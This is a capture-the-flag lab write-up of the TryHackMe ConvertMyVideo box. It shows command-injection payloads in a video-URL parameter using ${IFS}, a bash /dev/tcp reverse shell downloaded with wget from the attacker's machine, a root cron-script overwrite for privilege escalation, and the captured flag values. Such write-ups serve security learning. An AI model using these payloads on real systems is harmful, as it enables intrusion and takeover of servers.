---
title: TryHackMe - ConvertMyVideo Writeup
description: My writeup on ConvertMyVideo box.
categories:
 - tryhackme
tags: tryhackme
---

Hi all, let's pwn this!

You can find the machine there > [ConvertMyVideo](https://tryhackme.com/room/convertmyvideo){:target="_blank"}

As always let's start with a nmap scan.

```bash
$ ip=10.10.198.96
$ nmap -sC -sV -oN nmap.txt $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-20 15:56 EEST
Nmap scan report for 10.10.198.96 (10.10.198.96)
Host is up (0.23s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 65:1b:fc:74:10:39:df:dd:d0:2d:f0:53:1c:eb:6d:ec (RSA)
|   256 c4:28:04:a5:c3:b9:6a:95:5a:4d:7a:6e:46:e2:14:db (ECDSA)
|_  256 ba:07:bb:cd:42:4a:f2:93:d1:05:d0:b3:4c:b1:d9:b1 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Let's enumerate the `http` service. When we visit the website we can see this : 

![](https://i.ibb.co/SQNyp1L/Screenshot-2.png)

Let's capture the request and send it to repeater.

![](https://i.ibb.co/cQYBv5x/Screenshot-3.png)

We can try for command injection on parameter now, my first try was this :

```
yt_url=`cat /etc/passwd`
```

but i got this error :

```
{"status":2,"errors":"sh: 1: Syntax error: EOF in backquote substitution\n","url_orginal":"`cat","output":"","result_url":"\/tmp\/downloads\/5ec52bb9357de.mp3"}
```

Then i tried to bypass the `space` function with `${IFS}`

`IFS = Internal Field Separator`

```
yt_url=`cat${IFS}/etc/passwd`
```

Result :

```
Could not send HEAD request to root:x:0:0:root:\/root:\/bin\/bash:
```

Bingoo! ;) Let's spawn shell now. The way i found to get a shell is to create a reverse shell on my machine and `wget` it to target box.

```
$ touch shell.sh
$ echo "bash -i >& /dev/tcp/$your_ip/5555 0>&1" > shell.sh
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Then :

```
yt_url=`wget${IFS}$your_ip/shell.sh`
```

```
yt_url=`bash${IFS}shell.sh`
```

We have shell! Let's make it fully interactive.

```
$ nc -lvp 5555
listening on [any] 5555 ...
www-data@dmv:/var/www/html$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@dmv:/var/www/html$ ^Z (ctrl + z)
[1]+  Stopped                 nc -lvp 5555
$ stty raw -echo
execute "fg"
www-data@dmv:/var/www/html$ 
```

Now privilege escalation is pretty easy, a simple cron job exploitation, we can detect the cron job with an awesome tool : [pspy](https://github.com/DominicBreuker/pspy){:target="_blank"}

Download the binary & wget to `/tmp` on target's box.

Let's execute it :

```bash
www-data@dmv:/tmp$ chmod +x pspy64
www-data@dmv:/tmp$ ./pspy64 -p -i 1000
```

We can see this :

```bash
CMD: UID=0    PID=1822   | bash /var/www/html/tmp/clean.sh
```

This file runs as root, let's add our reverse shell in and get a root shell!

```bash
www-data@dmv:/tmp$ echo "" /var/www/html/tmp/clean.sh
www-data@dmv:/tmp$ echo "bash -i >& /dev/tcp/$your_ip/5555 0>&1" > /var/www/html/tmp/clean.sh    
www-data@dmv:/tmp$ cat /var/www/html/tmp/clean.sh
bash -i >& /dev/tcp/$your_ip/5555 0>&1
```

And after 1 minute..

```bash
$ nc -lvp 5555
listening on [any] 5555 ...
root@dmv:/var/www/html/tmp# whoami; id
whoami; id
root
uid=0(root) gid=0(root) groups=0(root)
```

Let's read the flags now.

```bash
root@dmv:/var/www/html/tmp# cat /root/root.txt
flag{d9b368018e912b541a4eb68399c5e94a}
root@dmv:/var/www/html/tmp# cat /var/www/html/admin/flag.txt
flag{0d8486a0c0c42503bb60ac77f4046ed7}
```

Easy one, See you!
